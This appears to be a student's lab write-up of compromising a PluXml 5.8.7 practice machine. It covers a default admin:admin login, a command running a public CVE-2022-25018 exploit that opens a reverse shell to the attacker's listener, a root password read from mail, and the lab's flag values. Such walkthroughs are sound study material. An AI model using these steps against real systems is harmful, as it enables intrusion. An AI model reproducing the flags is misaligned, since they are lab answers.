---
date: 2025-11-20
---

# Service Discovery

## Open Ports & Priority
TCP Ports:
- [x] 80
- [ ] 22

# Service Enumeration
## 80
![[Pasted image 20251120065820.png]]

The HTTP title and our scans from autorecon suggest that this is an instance of PluXML: https://www.pluxml.org

![[Pasted image 20251120065914.png]]

"Administration" link on the bottom of the page brings us to /core/admin.

![[Pasted image 20251120070007.png]]

Guessing admin:admin allows me to sign in.

![[Pasted image 20251120070021.png]]

The top left, under "Disconnect" shows that we're signed in as the administrator and that this is PluXml version 5.8.7.

![[Pasted image 20251120070429.png]]

Quickly googling PluXml rce exploit, I found a GitHub issue in the project explaining that v5.8.16 or lower allows for RCE after gaining access to the admin dashboard as we have:
https://github.com/pluxml/PluXml/issues/829

This was named CVE-2022-25018.

I found a POC exploit that I'll try for conevnience:
https://github.com/erlaplante/pluxml-rce

I'll start a reverse shell listener:
`penelope -p 80`

...and run the exploit...
`python3 pluxml.py http://192.168.195.28 admin admin 192.168.45.196 80`

![[Pasted image 20251120071118.png]]

...to get a connection back on my listener as www-data:
![[Pasted image 20251120071140.png]]

# Privilege Escalation
From linPEAS
![[Pasted image 20251120071636.png]]
Did some research, nothing interesting...

![[Pasted image 20251120074246.png]]

We have mail! That's unusual.

![[Pasted image 20251120074322.png]]

`root:6s8kaZZNaZZYBMfh2YEW`

This is accurate and allows us to log in as root!

![[Pasted image 20251120074418.png]]

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

/var/www/local.txt
8f8953d85431020e254b32a650a1e63c

/root/proof.txt
56cf7f04a492d738f3bf6ab54adc2a5a

![[Pasted image 20251120074638.png]]

